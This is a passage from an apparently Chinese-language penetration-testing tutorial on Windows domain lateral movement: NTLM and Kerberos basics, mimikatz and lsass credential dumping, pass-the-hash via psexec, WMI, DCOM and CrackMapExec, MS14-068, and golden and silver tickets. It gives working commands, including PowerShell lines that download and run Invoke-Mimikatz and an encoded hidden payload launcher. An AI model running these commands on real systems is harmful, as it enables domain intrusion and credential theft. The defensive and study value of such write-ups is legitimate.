Server（or  later）工作组环境中（Kerberos用在域模式下）；在AD域环境中，如果需要认证Windows  NT系统，也必须采用NTLM。NTLM主要是一种<strong>基于挑战（challenge）/响应（response）消息交互模式的认证过程</strong>：</p><p>  1、用户登录时输入的user name、password和domain name，然后Client端计算password的hash值并保存在本地；</p><p>  2、客户端将user name的明文发送给DC；</p><p>  3、DC生成一个16-byte的随机数，叫做challenge，传输给client；</p><p>  4、client收到challenge以后，在复制一份拷贝，然后将其中一个challenge用password hash加密，这个叫做response，然后将challenge，response以及user name传送给server；</p><p>  5、server端在收到client传送过来的三份内容以后将它们转发给DC；</p><p>  6、DC在收到user name，response，challenge以后，根据user name在account database中找到其对应的password hash，然后用这个password hash加密challenge；</p><p>  7、DC将response跟加密后的challenge进行比较，如果相同则NTLM验证成功。DC将验证结果发给Server，并最终返回给Client。</p><p>  如果是使用本地用户身份进行认证，则有Server本身完成认证过程。</p><p><strong>hash储存：SAM文件(local)、NTDS.DIT文件(domain)</strong></p><blockquote><p>SAM(Security Account Manager) 安全账户管理器是一个数据库文件，在Windows  XP，Windows Vista,windows7-10用于存储用户的密码。他可以用来验证本地和远程用户。在windows 2000 sp4  开始,Active Dircetory 对远程用户进行身份验证。SAM使用加密措施来防止未经身份验证的用户访问系统。</p><p>用户密码以哈希格式存储在 注册表配置单元中(registry hive), 作为LM Hash or NTLM Hash.</p><p>这个文件可以在<code>%SystemRoot%/system32/config/SAM</code> 和 挂载在<code>HKLM/SAM</code></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200807163204-78c2e474-d888-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200807163204-78c2e474-d888-1.png"></a></p><p>WIndows运行时无法移动或者复制SAM文件，因为Windows 内核获取并在SAM文件上保留了独占的文件系统锁，并且在操作系统关闭之前不会释放该锁，但是我们可以通过多种技术比如pwdump来转储SAM内容的内存中副本，从而使密码哈希可用于离线暴力攻击。</p><p>后来为了提高针对破解的SAM数据库的安全性, Microsoft 在Windows NT 4.0 中引入了SYSKEY功能。该功能会使用密钥对存储在SAM中的所有本地账户的密码哈希值进行加密。可以通过<code>syskey</code>程序来启用它。</p></blockquote><h4 id="hash抓取"><a href="#hash抓取" class="headerlink" title="hash抓取"></a>hash抓取</h4><p>比较老的工具：<a href="http://www.tarasco.org/security/pwdump_7/index.html">PwDump7</a>，需要管理员权限</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">usage:<br>pwdump7.<span class="hljs-keyword">exe</span> (Dump <span class="hljs-built_in">system</span> passwords)<br>pwdump7.<span class="hljs-keyword">exe</span> -s <span class="hljs-symbol">&lt;samfile&gt;</span> <span class="hljs-symbol">&lt;systemfile&gt;</span> (Dump passwords from <span class="hljs-keyword">files</span>)<br>pwdump7.<span class="hljs-keyword">exe</span> -d <span class="hljs-symbol">&lt;filename&gt;</span> [destionation] (Copy filename <span class="hljs-keyword">to</span> destionation)<br>pwdump7.<span class="hljs-keyword">exe</span> -h (Show this <span class="hljs-keyword">help</span>)<br></code></pre></td></tr></table></figure><p>非常出名的工具：<a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></p><blockquote><ul><li>lsass.exe进程读取(内存)</li></ul><p>privilege::debug //提升至debug权限</p><p>sekurlsa::logonpasswords //从lsass.exe的内存中抓取密码hash</p><p>//mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220102572.png"></p><ul><li>online</li></ul><p>privilege::debug</p><p>token::elevate //模拟一个SYSTEM令牌</p><p>lsadump::sam //从sam文件导出密码hash</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220228030.png"></p></blockquote><p><a href="https://github.com/peterdocter/quarkspwdump">QuarkPwDump</a>，需编译</p><p>还可以导出<code>SAM和SYSTEM</code>文件再抓取密码</p><blockquote><p>reg save HKLM\SYSTEM system.hive</p><p>reg save HKLM\SAM sam.hive</p><p>reg save HKLM\security security.hive</p></blockquote><p>将把导出的<code>sam.hive</code>跟<code>system.hive</code>文件放到<code>mimikatz</code>下</p><blockquote><ul><li>offline</li></ul><p>lsadump::sam /sam:sam.hive /system:system.hive</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220447046.png"></p></blockquote><ul><li>进程导出</li></ul><ol><li><p>任务管理器-&gt;进程中创建转储文件</p></li><li><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">Procdump</a>是微软的工具，<del>杀毒软件不会拦截</del>360拦截</p></li></ol><blockquote><p>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</p><p>再mimikatz导出密码hash</p><p>sekurlsa::minidump lsass.DMP<br>sekurlsa::logonPasswords full</p></blockquote><p>cs</p><p>powershell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz -DumpCreds&quot;</span><br><br>powershell <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz -Command \&quot;</span>privilege::debug token::elevate  lsadump::sam <span class="hljs-keyword">exit</span>\<span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><h4 id="防范抓取明文密码和hash"><a href="#防范抓取明文密码和hash" class="headerlink" title="防范抓取明文密码和hash"></a>防范抓取明文密码和hash</h4><p><strong>1、设置Active Directory2012 R2功能级别</strong></p><p>windows server 2012 R2新增了一个名为<code>受保护的用户</code>的用户组。将需要保护的用户放入该组，则无法使用mimikatz等工具抓取明文密码和散列值了</p><p><strong>2、安装KB2871997</strong></p><p>KB2871997是解决PsExec或IPC远程查看（c$）问题的补丁，被使本地账号不再被允许远程接入计算机系统，但系统默认的本地管理员账号Administrator这个SID为500的用户例外，改名也没法，因为SID是不变的，依旧可以横向获取内网其他计算机的权限，需要禁用默认的Administrator账号，则可防御哈希传递</p><p><strong>1、2总结就是：系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。</strong></p><p><strong>3、通过修改注册表禁止在内存中存储明文密码</strong></p><p>WDigest协议，该协议能够使Windows将明文密码存储在内存中，以方便用户登录本地计算机，可通过修改注册表的方式，解决内存中以明文存储密码的问题</p><p><strong>4、防御mimikatz</strong></p><p>mimikatz在抓取散列值或明文密码时需要使用Debug权限（因为mimikatz需呀和lsass进程进行交互，如果没有Debug权限，mimikatz将不能读取lsass进程）。将拥有Debug权限的本地管理员从Administrator组中删除,重启</p><h2 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass The Hash"></a>Pass The Hash</h2><p><strong>截取到hash后，哈希传递一般是在非域用户中进行传递，实验时发现，域用户不用进行hash传递就可以建立IPC连接</strong></p><p><code>哈希传递（Pass The Hash）攻击</code>，该方法通过找到与账户相关的密码散列值，通常是<code>NTLM Hash</code>来进行攻击。域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码。若计算机的本地管理员账号和密码是相同的，就可以使用哈希传递的方法登录内网中的其他计算机，这种哈希传递，可以省去破解密码散列值，即获得密码明文的步骤</p><p>Windows中，散列值是用来证明身份的（有正确的用户名和密码散列值，就能通过验证）。在windows server 2012 R2  及之后的操作系统中，默认在内存不会记录明文密码。因此可使用工具将散列值传递到其他计算机，进行权限验证，进而对其他计算机获取控制权限</p><ol><li>mimikatz</li></ol><blockquote><p>privilege::debug</p><p>sekurlsa::pth /user:Administrator /domain:god /ntlm:8a963371a63944419ec1adf687bb1be5  //使用ntlm传递</p><p><strong>Pass the key</strong></p><p>也可以用AES-256等传递，<strong>获取：sekurlsa::ekeys</strong>  </p><p>还是使用IPC等无密码连接到目AES标主机，dir \STU1\C$</p></blockquote><p>可见，没有进行hash修改的IPC等连接会出现登录失败</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404135504518.png"></p><ol start="2"><li>psexec</li></ol><p>微软官方版本：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></p><blockquote><p>需要远程系统开启admin$共享（默认是开启的）</p><p>在使用ipc$连接目标系统后，不需要输入账号和密码</p><p>使用PsExec执行命令时，由于创建或删除服务时<strong>会产生大量的日志，可通过日志反推攻击流程</strong></p><p><strong>使用PsExec可以直接获得system权限的交互式shell</strong></p><p>建立IPC后使用，可以弹回一个shell</p><p>net use \\192.168.20.128 “password” /user:Administrator</p><p>//-accepteula 第一次执行PsExec时会弹出确认框，而使用该参数就可以在静默模式下运行而不会被发现 -s system</p><p>psexec.exe -accepteula \\192.168.20.128 -s cmd.exe</p><p>psexec.exe -accepteula \\192.168.20.128 cmd.exe</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/psexec.gif" alt="psexec"></p><p>没有建立IPC</p><p>PsExec.exe \192.168.20.128 -u QWE\Administrator -p password cmd.exe</p></blockquote><p>使用PsExec，会在目标机中创建一个新的服务PSEXESVC；在结束交互后，PsExec服务会自动删除，但是在创建以及删除时会产生大量日志信息，所以可以基于此对攻击者进行溯源。拜读了一下<a href="https://www.secpulse.com/archives/146441.html">酒仙桥六号部队的浅谈PSEXEC做的那些事</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220405133254579.png"></p><p><a href="https://github.com/SecureAuthCorp/impacket">impacket</a></p><blockquote><p>python psexec.py  <a href="mailto:&#x41;&#100;&#x6d;&#105;&#110;&#x69;&#115;&#116;&#114;&#97;&#x74;&#x6f;&#114;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#46;&#x32;&#48;&#46;&#x31;&#x32;&#x38;">&#x41;&#100;&#x6d;&#105;&#110;&#x69;&#115;&#116;&#114;&#97;&#x74;&#x6f;&#114;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#46;&#x32;&#48;&#46;&#x31;&#x32;&#x38;</a>   -hashes 11cb3f697332ae4c82681f36d6708901:aba61272394a2f975d6543aa0541b005</p></blockquote><p><a href="https://github.com/maaaaz/impacket-examples-windows">impacket-win</a></p><p>微软自带的psexec我是通过使用mimikatz哈希传递后建立IPC连接然后psexec去获得shell，这个工具包可以自己pth</p><p>用法：</p><blockquote><p>Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies</p><p>usage: psexec.exe [-h] [-c pathname] [-path PATH] [-file FILE] [-debug]<br>               [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]<br>               [-dc-ip ip address] [-target-ip ip address]<br>               [-port [destination port]] [-service-name service name]<br>               target [command [command …]]</p><p>PSEXEC like functionality example using RemComSvc.</p><p>positional arguments:<br>target                [[domain/]username[:password]@]&lt;targetName or address&gt;<br>command               command (or arguments if -c is used) to execute at the<br>                     target (w/o path) - (default:cmd.exe)</p><p>optional arguments:<br>-h, –help            show this help message and exit<br>-c pathname           copy the filename for later execution, arguments are<br>                     passed in the command option<br>-path PATH            path of the command to execute<br>-file FILE            alternative RemCom binary (be sure it doesn’t require<br>                     CRT)<br>-debug                Turn DEBUG output ON</p><p>authentication:<br><strong>-hashes LMHASH:NTHASH</strong><br>                     NTLM hashes, format is LMHASH:NTHASH<br>-no-pass              don’t ask for password (useful for -k)<br>-k                    Use Kerberos authentication. Grabs credentials from<br>                     ccache file (KRB5CCNAME) based on target parameters.<br>                     If valid credentials cannot be found, it will use the<br>                     ones specified in the command line<br>-aesKey hex key       AES key to use for Kerberos Authentication (128 or 256<br>                     bits)</p><p>connection:<br>-dc-ip ip address     IP Address of the domain controller. If omitted it<br>                     will use the domain part (FQDN) specified in the<br>                     target parameter<br>-target-ip ip address<br>                     IP Address of the target machine. If omitted it will<br>                     use whatever was specified as target. This is useful<br>                     when target is the NetBIOS name and you cannot resolve<br>                     it<br>-port [destination port]<br>                     Destination port to connect to SMB Server<br>-service-name service name<br>                     This will be the name of the service</p></blockquote><blockquote><p>psexec.exe <a href="mailto:&#x41;&#100;&#109;&#105;&#110;&#105;&#115;&#116;&#x72;&#x61;&#x74;&#x6f;&#114;&#64;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#46;&#x32;&#x30;&#x2e;&#49;&#50;&#56;">&#x41;&#100;&#109;&#105;&#110;&#105;&#115;&#116;&#x72;&#x61;&#x74;&#x6f;&#114;&#64;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#46;&#x32;&#x30;&#x2e;&#49;&#50;&#56;</a> -hashes 11cb3f697332ae4c82681f36d6708901:aba61272394a2f975d6543aa0541b005</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220405134813532.png"></p></blockquote><p>msf也有psexec模块</p><ol start="3"><li>WMI</li></ol><p>由于PsExec威力很大，也被列入黑名单，而且容易暴露，于是就使用了隐蔽性更好的WMI</p><p>WMI是“Windows Management Instrumentation”的缩写，WMI是从Windows98开始，系统自带的一系列工具集。WMI提供了/node选项，可以通过135端口上的RPC服务进行远程访问，或者执行远程命令。Windows操作系统默认不会将WMI的操作记录到日志当中，而且因为采用的是无文件攻击，所以导致WMI具有极高的隐蔽性。由此，越来越多的APT开始使用WMI进行攻击，利用WMI可以进行信息收集、探测、反病毒、虚拟机检测、命令执行、权限持久化等操作。</p><blockquote><p>wmic /node:192.168.20.128 /user:Administrator /password:p@ssword123. process call create “cmd.exe /c ipconfig &gt;c:\ip.txt”</p></blockquote><p>建立IPC后，type读取txt</p><blockquote><p>net use \DC “p@ssword123.” /user:Administrator<br>type \DC\C$\ip.txt</p></blockquote><p>使用wmic远程执行命令，在远程系统中启动windows management lnstrumentation  服务（目标服务器需要开放135端口，wmic会以管理员权限在远程系统中执行命令）。如果目标服务器开启了防火墙，wmic将无法进行连接。wmic命令没有回显，需要使用<code>ipc$和type</code>命令来读取信息，若使用wmic执行恶意程序，将不会留下日志</p><p>还是使用impacket的两个工具包，有些还支持socks代理</p><blockquote><p>wmiexec.exe domain/user:password@target-ip</p><p>wmiexec.exe QWE/Administrator:p@<a href="mailto:&#115;&#x73;&#x77;&#x6f;&#114;&#100;&#x31;&#50;&#51;&#46;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#50;&#x30;&#x2e;&#x31;&#x32;&#x38;">&#115;&#x73;&#x77;&#x6f;&#114;&#100;&#x31;&#50;&#51;&#46;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#50;&#x30;&#x2e;&#x31;&#x32;&#x38;</a></p></blockquote><ol start="4"><li><a href="https://github.com/sunorr/smbexec">smbexec</a></li><li>DOM</li></ol><p><code>DCOM（分布式组件对象模型）</code>是微软的一系列概念和程序接口。通过DOCM,客户端程序对象能够向网络中的另一台计算机上的服务器程序对象发送请求。DCOM是基于组件对象模型（COM）的。COM提供了一套允许在同一台计算机上的客户端和服务器之间进行通信的接口（运行在Windows95及之后版本的操作系统中）</p><p><code>Get-CimInstance</code>这个cmdlet（PowerShell命令行）默认只在powershell3.0以上版本中存在。因此只在windows server 2012及以上本本的操作系统才可以使用Get-CimInstance</p><blockquote><p> Get-CimInstance Win32_DCOMApplication //获取DCOM程序列表</p></blockquote><p><code>Windows7、Windows server 2008</code>中默认安装的是<code>powershell 2.0</code>。不支持Get-CimInstance。可以使用如下命令代替</p><blockquote><p>Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication //获取DCOM程序列表</p></blockquote><p>获取到DCOM程序列表后，<strong>建立IPC</strong>，最后执行命令(这个方法需要关闭系统防火墙。在远程机器上执行命令时，必须使用具有本地管理员权限的账号)</p><ul><li>调用<code>MMC20.Application</code>远程执行命令</li></ul><blockquote><p>$com=[activator]::CreateInstance([type]::GetTypeFromProgID(“MMC20.Application”,”ip”))<br>$com.Document.ActiveView.ExecuteShellCommand(‘cmd.exe’,$null,”/c calc.exe”,”Minimzed”)</p></blockquote><ul><li>调用<code>9BA05972-F6A8-11CF-A442-00A0C90A8F39</code></li></ul><blockquote><p>$com = [Type]::GetTypeFromCLSID(‘9BA05972-F6A8-11CF-A442-00A0C90A8F39’, “ip”)<br>$obj = [System.Activator]::CreateInstance($com)<br>$item = $obj.item()<br>$item.Document.Application.ShellExecute(“cmd.exe”,”/c calc.exe”, “c:\windows\system32”,$null,0)</p></blockquote><ol start="7"><li><strong>批量移动</strong></li></ol><p>CrackMapExec集成了wmiexec、atexe、smbexec，集成了smb扫描,口令爆破等功能,非常适合拿来快速移动</p><p>其中，批量传递hash：(88,90多个目标使用相同hash传递)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cme</span> smb <span class="hljs-number">10.73.147.90</span> <span class="hljs-number">10.73.147.88</span> -u administrator -H <span class="hljs-number">852</span>a<span class="hljs-number">844</span>adfce<span class="hljs-number">18</span>f<span class="hljs-number">66009</span>b<span class="hljs-number">4</span>f<span class="hljs-number">14</span>e<span class="hljs-number">0</span>a<span class="hljs-number">98</span>de<br><span class="hljs-attribute">cme</span> smb <span class="hljs-number">10.73.147.90</span> <span class="hljs-number">10.73.147.88</span> -u administrator -H <span class="hljs-number">852</span>a<span class="hljs-number">844</span>adfce<span class="hljs-number">18</span>f<span class="hljs-number">66009</span>b<span class="hljs-number">4</span>f<span class="hljs-number">14</span>e<span class="hljs-number">0</span>a<span class="hljs-number">98</span>de  -x <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure><p>配合cs上马</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cme</span> smb <span class="hljs-number">10.211.55.51</span>  <span class="hljs-number">10.211.55.52</span> -u administrator  -H <span class="hljs-number">852</span>a<span class="hljs-number">844</span>adfce<span class="hljs-number">18</span>f<span class="hljs-number">66009</span>b<span class="hljs-number">4</span>f<span class="hljs-number">14</span>e<span class="hljs-number">0</span>a<span class="hljs-number">98</span>de -x <span class="hljs-string">&quot;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0...&quot;</span><br></code></pre></td></tr></table></figure><h2 id="Mimikatz‘s-AV-Bypass"><a href="#Mimikatz‘s-AV-Bypass" class="headerlink" title="Mimikatz‘s  AV Bypass"></a>Mimikatz‘s  AV Bypass</h2><p>在装有杀毒软件的情况下，上传mimkatz，360火绒都能检测删除，或者进程拦截</p><p>绕过的姿势：<a href="https://www.freebuf.com/articles/web/176796.html">https://www.freebuf.com/articles/web/176796.html</a></p><h2 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass The Ticket"></a>Pass The Ticket</h2><h3 id="Kerberos协议认证过程"><a href="#Kerberos协议认证过程" class="headerlink" title="Kerberos协议认证过程"></a>Kerberos协议认证过程</h3><p>Kerberos协议是一种基于第三方可信主机的计算机网络协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。Kerberos协议在在内网域渗透中至关重要，白银票据、黄金票据、攻击域控等都离不开kerberos协议。</p><p><strong>关键角色：</strong></p><ul><li><strong>Domain Controller (域控制器)，简称DC，一台计算机，实现用户、计算机的统一管理。</strong></li><li><strong>Key Distribution Center(秘钥分发中心)，简称KDC，默认安装在域控里，包括AS和TGS。</strong> </li><li><strong>Authentication Service(身份验证服务)，简称AS，用于KDC对Client认证。</strong> </li><li><strong>Ticket Grantng Service (票据授予服务)，简称TGS，用于KDC向Client和Server分发Session Key（临时key）。</strong> </li><li><strong>Active Directory(活动目录)，简称AD，用于存储用户、用户组、域相关的信息。</strong> </li><li><strong>Client 客户端，指用户。</strong> </li><li><strong>Server 服务端，可能是某台计算机，也可能是某个服务。</strong></li></ul><p>打个比方：当whoami要和bunny进行通信的时候，whoami就需要向bunny证明自己是whoami，直接的方式就是whoami用二人之间的秘密做秘钥加密明文文字生成密文，把密文和明文文字一块发送给bunny，bunny再用秘密解密得到明文，把明文和明文文字进行对比，若一致，则证明是whoami。</p><p>但是网络中，密文和文字很有可能被窃取，并且只要时间足够，总能破解得到秘钥。所以不能使用这种长期有效的秘钥，要改为短期的临时秘钥。那么这个临时秘钥就需要一个第三方可信任的机构来提供，即KDC（Key Distribution Center）。</p><p>下面讲一下详细的认证步骤，大概分为三个阶段：</p><p><strong>AS-REQ—AS-REP阶段：</strong></p><p>首先Client用自己的哈希值NTLM-hash对timestamp、client-info、server-info等数据进行加密，发送给AS，向AS请求TGT票据。（<strong>AS-REQ</strong>）</p><p>当AS收到Client发来的信息后，AS会先向域控AD请求，询问是否有此Client用户，如果有的话，就会取出该Client的NTLM hash，然后生成一个随机秘钥称为Session-Key as（临时秘钥Session-Key）。并使用Client NTLM-hash 加密 Session-key as 作为一部分内容。</p><p>还有一部分内容就是TGT：使用KDC一个特定账户krbtgt的NTLM-hash对Session-key as、timestamp、Client-info进行的加密。然后将这两部分回复给Client。（<strong>AS-REP</strong>）</p><p>该阶段是Client和AS的认证。</p><p><strong>TGS-REQ—TGS-REP阶段：</strong></p><p>Client 收到AS发来的AS-REP后，先使用自身的 NTLM Hash 解密得到 Session-key as，然后使用 Session-key as 对 Client-Info、timestamp、Server-Info 加密作为一部分，加上TGT ，一并发送给 KDC中的 TGS。（<strong>TGS-REQ</strong>）</p><p>TGS 收到请求后，使用 krbtgt 的 NTLM Hash 解密 TGT，得到 Session-key  as、timestamp、Client-info，同时，使用 TGT 解密出的 Session-key as  解密第一部分内容，得到Client-info、timestamp。  比对这两部分解密得到的内容以验证是否通过。通过后，生成一个新的随机秘钥(Session-Key tgs)，并向Client回复<strong>TGS-REP的</strong>两部分内容：</p><ol><li>一部分是Session-key as 加密的 Session-key tgs</li><li>另一部分是ST(ticket)，即Server NTLM-hash加密的数据(Session-key tgs、timestamp、Client-info)</li></ol><p>该阶段是Client和KDC的通信。</p><p><strong>AP-REQ—AP-REP阶段：</strong></p><p>Client收到<strong>TGS-REP后</strong>，先用自己保存的Session-key as解密出了Session-key tgs。再使用Session-key tgs加密Client-info、timestamp作为一部分内容，另一部分是ST，一并发送给Server。（<strong>AP-REQ</strong>）</p><p>Server 收到Client发来的<strong>AP-REQ</strong>后，用自身的NTLM Hash解密了ST，得到Session-key tgs，再用Session-key  tgs解密第一部分得到Client-info、timestamp。然后与ST的Client-info、timestamp进行对比。timestamp 一般时间为8小时。验证通过后，回复<strong>AP-REP</strong>，最终建立通信。</p><p>上面的PTH攻击，需要获取到NTLM，必须要获得目标的管理员权限，如果没有管理员权限下，要么提权，要么可以试一试PTT</p><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>PAC是用来验证Client的访问权限的，它会被放在TGT里发送给Client，然后由Client发送给TGS。</p><p>Windows域中使用kerberos协议过程中，为了让服务器判断Client是否有权限访问服务，微软在Windows平台上对Kerberos协议进行了一些扩充，即在协议中增加了PAC（Privilege Attribute Certificate），特权属性证书，也就是这个PAC造成了MS14-068这个漏洞。</p><p>MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中<strong>插入任意的PAC</strong>（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。<strong>普通用户可以通过呈现具有改变了PAC的Kerberos TGT来获得票证，进而伪造票据获得管理员权限。</strong></p><p><strong>利用条件：</strong></p><blockquote><p>获取任意用户SID</p><p>域内任意账号的密码</p></blockquote><p><strong>利用：</strong></p><p>找利用工具：<a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068</a></p><p>生成TGT(ccache)</p><blockquote><p>MS14-068 -u <a href="mailto:&#116;&#x65;&#x73;&#116;&#64;&#81;&#x57;&#x45;&#46;&#x69;&#x6f;">&#116;&#x65;&#x73;&#116;&#64;&#81;&#x57;&#x45;&#46;&#x69;&#x6f;</a> -s S-1-5-21-264158955-2367710963-2250079592-1105 -d DC.QWE.io -p p@ssword123.</p></blockquote><p>mimikatz注入票据</p><blockquote><p>kerberos::purge  //清空所有凭证，有其他凭证会影响伪造</p><p>kerberos::list       //列出所有凭证</p><p>kerberos::ptc       //注入票据</p></blockquote><blockquote><p>net use \\DC        …</p></blockquote><h3 id="黄金票据-Golden-ticket"><a href="#黄金票据-Golden-ticket" class="headerlink" title="黄金票据(Golden ticket)"></a>黄金票据(Golden ticket)</h3><p>在Windows的kerberos认证过程中，Client将自己的信息发送给KDC，然后KDC使用krbtgt用户的Hash作为密钥进行加密，生成TGT。那么如果获取到了krbtgt的Hash值，不就可以伪造任意的tgt了吗。<strong>因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限，黄金凭据可以理解为一个后门。</strong></p><blockquote><p>先假设这么一种情况，原先已拿到的域内所有的账户Hash，包括krbtgt这个账户，由于有些原因导致你对域管权限丢失，但好在你还有一个普通域用户权限，碰巧管理员在域内加固时忘记重置krbtgt密码，基于此条件，我们还能利用该票据重新获得域管理员权限，<strong>利用krbtgt的HASH值可以伪造生成任意的TGT(mimikatz)，能够绕过对任意用户的账号策略，让用户成为任意组的成员，可用于Kerberos认证的任何服务</strong>。</p></blockquote><p>攻击者再使用黄金票据进行票据传递攻击时，通常要掌握以下信息：</p><ul><li>需要伪造的域管理员用户名</li><li>完整的域名</li><li>域SID</li><li>krbtgt的NTLM Hash</li></ul><p><strong>利用：</strong></p><p>登录域控抓取krbtgt用户的Hash值并获取域SID</p><p><strong>经测试，win10/server2022抓取会关机，已在此设备上禁用对动态访问控制的Kerberos 支持</strong></p><blockquote><p>privilege::debug</p><p>lsadump::lsa /patch        // 专用于在域控制器上导出用户密码或hash</p><p>或者：</p><p>lsadump::dcsync /domain:QWE.io /user:krbtgt  //取得的sid值后面三位去除</p></blockquote><ul><li>生成票据后注入</li></ul><p>然后在普通域用户机器，用mimikatz生成名为ticket.kirbi的TGT凭证，用户名为Administrator </p><blockquote><p>kerberos::golden /user:Administrator /domain:QWE.io /sid:S-1-5-21-979886063-1111900045-1414766810 /krbtgt:7c4ed692473d4b4344c3ba01c5e6cb63 /ticket:ticket.kirbi</p></blockquote><p>注入TGT票据</p><blockquote><p>kerberos::ptt ticket.kirbi</p></blockquote><p>查看tgt</p><blockquote><p>kerberos::tgt</p></blockquote><blockquote><p>net use \\DC        …</p></blockquote><ul><li>生成并直接导入</li></ul><blockquote><p>privilege::debug<br>kerberos::golden /user:Administrator /domain:QWE.io /sid:S-1-5-21-2189311154-2766837956-1982445477 /krbtgt:7aad81625fab43e7fdb3cd9f399c060c /ptt  //生成票据并导入</p><p>或者也可以使用krbtgt的AES-256<br>privilege::debug<br>kerberos::golden /user:Administrator /domain:QWE.io /sid:S-1-5-21-2189311154-2766837956-1982445477 /aes256:93c335cce03858c917fa2ea98ca79f0b791c93c33ab17936784548114648cda7  /ptt</p></blockquote><h3 id="白银票据-Silver-ticket"><a href="#白银票据-Silver-ticket" class="headerlink" title="白银票据(Silver ticket)"></a>白银票据(Silver ticket)</h3><p>白银票据不同于黄金票据，白银票据的利用过程是伪造TGS，通过已知的授权服务密码生成一张可以访问该服务的TGT。因为在票据生成过程中不需要使用KDC，所以可以绕过域控制器，很少留下日志。而黄金票据在利用过程中由KDC颁发TGT，并且在生成伪造的TGT得20分钟内，TGS不会对该TGT的真伪进行效验。</p><p>白银票据依赖于服务账号的密码散列值，这不同于黄金票据利用需要使用krbtgt账号的密码哈希值，因此更加隐蔽。</p><p>攻击者要利用白银票据进行票据传递攻击，需要掌握下面几个信息：</p><ul><li>域名</li><li>域SID</li><li>目标服务器的FQDN</li><li>可利用的服务</li><li>服务账号的NTLM Hash</li><li>要伪造的用户名</li></ul><p><strong>利用：</strong></p><p>登录域控，抓取共享服务账号hash</p><blockquote><p>privilege::debug</p><p>sekurlsa::logonpasswords</p></blockquote><p>在普通域用户中，生成白银票据</p><blockquote><p>kerberos::golden /domain:QWE.io /sid:SID /target:DC.QWE.io /rc4:hash /service:cifs /user:admin /ptt</p></blockquote><p>其中</p><blockquote><p>/service:目标服务器上面的kerberos服务，此处为cifs</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">服务名称                    同时需要的服务<br><span class="hljs-variable">WMI</span>                        <span class="hljs-variable">HOST</span>、<span class="hljs-variable">RPCSS</span><br><span class="hljs-variable">PowerShell</span> <span class="hljs-variable">Remoting</span>        <span class="hljs-variable">HOST</span>、<span class="hljs-variable">HTTP</span><br><span class="hljs-variable">WinRM</span>                      <span class="hljs-variable">HOST</span>、<span class="hljs-variable">HTTP</span><br><span class="hljs-variable">Scheduled</span> <span class="hljs-built_in">Tasks</span>            <span class="hljs-variable">HOST</span><br><span class="hljs-variable">Windows</span> <span class="hljs-built_in">File</span> <span class="hljs-built_in">Share</span>         <span 